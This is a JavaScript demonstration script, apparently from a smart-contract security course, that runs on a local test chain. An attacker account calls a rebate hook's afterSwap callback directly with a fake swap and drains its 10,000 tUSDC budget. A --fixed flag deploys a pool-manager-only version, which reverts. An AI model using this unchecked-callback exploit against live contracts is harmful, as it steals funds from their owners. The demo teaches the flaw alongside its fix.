// Attack #1: a callback anyone can call. Our rebate hook pays 1% of each swap from a 10,000 tUSDC
// budget, after the swap. The attacker never swaps: they call afterSwap directly with a fake swap.
//   node demos/01-callback.mjs           no caller check: budget 10,000 → 0
//   node demos/01-callback.mjs --fixed   onlyPoolManager: reverts NotPoolManager
import { encodeAbiParameters } from "viem";
import { startChain, stopChains, roles, abis, units, fmt, ZERO } from "../lib/chain.mjs";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const t = session(fixed ? "callback-fixed" : "callback", fixed ? "A callback anyone can call, fixed" : "A callback anyone can call");
const C = await startChain();
const A = roles.attacker;

const usdc = await C.deploy("token", ["Test USDC", "tUSDC", 6]);
const eth = await C.deploy("token", ["Test ETH", "tETH", 18]);
const manager = await C.deploy("manager");
// --fixed only picks which hook contract is deployed.
const hook = await C.deploy(fixed ? "rebateFixed" : "rebate", [manager, usdc]);
const habi = fixed ? abis.rebateFixed : abis.rebate;
const key = { currency0: usdc, currency1: eth, fee: 3000, hooks: hook };
await C.send(roles.deployer, manager, abis.manager, "initialize", [key]);
await C.fund(usdc, hook, units(10_000, 6));

const budget = async () => fmt(await C.balanceOf(usdc, hook), 6);
t.say(`rebate hook budget: ${await budget()} tUSDC · pays 1% of every swap`);
t.cmd(`attacker → hook.afterSwap(fake swap of 1,000,000 tUSDC, recipient = attacker)   # not via the pool manager`);
const params = { zeroForOne: true, amountIn: units(1_000_000, 6) };
const r = await C.attempt(A, hook, habi, "afterSwap", [A.address, key, params, 0n, encodeAbiParameters([{ type: "address" }], [A.address])]);
if (r.ok) t.bad(`  ✓ accepted`); else t.ok(`  ✗ reverted: ${r.name}`);
const swaps = await C.read(manager, abis.manager, "swapCount");
const got = await C.balanceOf(usdc, A.address);
t.note(`  real swaps through the pool manager: ${swaps}`);
(got > 0n ? t.bad : t.ok)(`  attacker received ${fmt(got, 6)} tUSDC · hook budget ${await budget()}`);
t.big(got > 0n ? `0 SWAPS · BUDGET 10,000 → ${await budget()}` : `REVERTED · BUDGET STILL ${await budget()}`);
t.save(); stopChains(); process.exit(0);
